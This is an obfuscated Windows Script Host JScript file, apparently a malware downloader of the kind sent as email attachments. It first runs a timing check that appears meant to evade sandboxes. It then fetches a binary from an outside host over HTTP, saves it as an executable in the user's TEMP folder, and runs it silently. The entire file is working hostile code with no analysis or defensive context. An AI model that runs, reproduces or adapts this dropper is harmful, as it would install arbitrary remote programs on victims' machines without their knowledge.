var AR = false;
var X = "CreateObject";
var y = function s() {return WScript[X]("WScript.Shell");}(), pr = 11;
var l = "MSXML2.XMLHTTP";
var d = 2123213;
var lC = 0;
function YJ(l0){y["Run"](l0, lC, lC);};
function nU(){return "" + l;};
function LD(q, D0){lC = lC * 1; return q - D0;};
function D(){return X;};
/*@cc_on
  @if (@_win32 || @_win64)
    AR = true;
  @end
@*/
if (AR)
{
var v = "";
function j(){return 22;};
var mR = 0; var n = 0;
function w()
{
var J = new this["Date"]();
var hi = J["getUTCMilliseconds"]();
WScript["Sleep"](j());
var J = new this["Date"]();
var N = J["getUTCMilliseconds"]();
WScript["Sleep"](j());
var J = new this["Date"]();
var af = J["getUTCMilliseconds"]();
var mR = "e";
mR = LD(N, hi);
var n = "hA";
n = LD(af, N);
v = "open";
return LD(mR, n);
}
var o0 = false;
var d0 = false;
for (var o = lC; o < j() * 1; o++){if (w() != lC){
o0 = true; 
n = "31" + 11 * mR + n; 
d0 = true; 
break;
}}
function Fz() {return ((o0 == true) && (o0 == d0)) ? 1 : lC;};
if (o0 && Fz() && d0){
function KF() {return y["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "ADMjpyzNF9K9DX7r.exe";};
 J0 = nU();
 Qu = WScript[X](J0);
 var yC = 1;
 while (yC){
try {
Qu[v]("GET", "http://zilton.com/o9qwp", false);
Qu["send"]();
g = "Sleep";
for (;;){WScript[g](j() * 11); if (Qu["readystate"] >= 2 * 2) break;};
yC = lC;
} catch(Zb){};
}
function k(gF) {var pX = (1, 2, 3, 4, 5, gF); return pX;};
rC = WScript[D()]("ADODB.Stream");
J0 = rC;
J0[v]();
J0["type"] = k(1);
J0["write"](Qu["ResponseBody"]);
rC["position"] = k(lC);
J0["Save" + "ToFile"](KF(), 2);
rC["c"+"lose"]();
BJ = KF();
YJ(BJ);
}
}

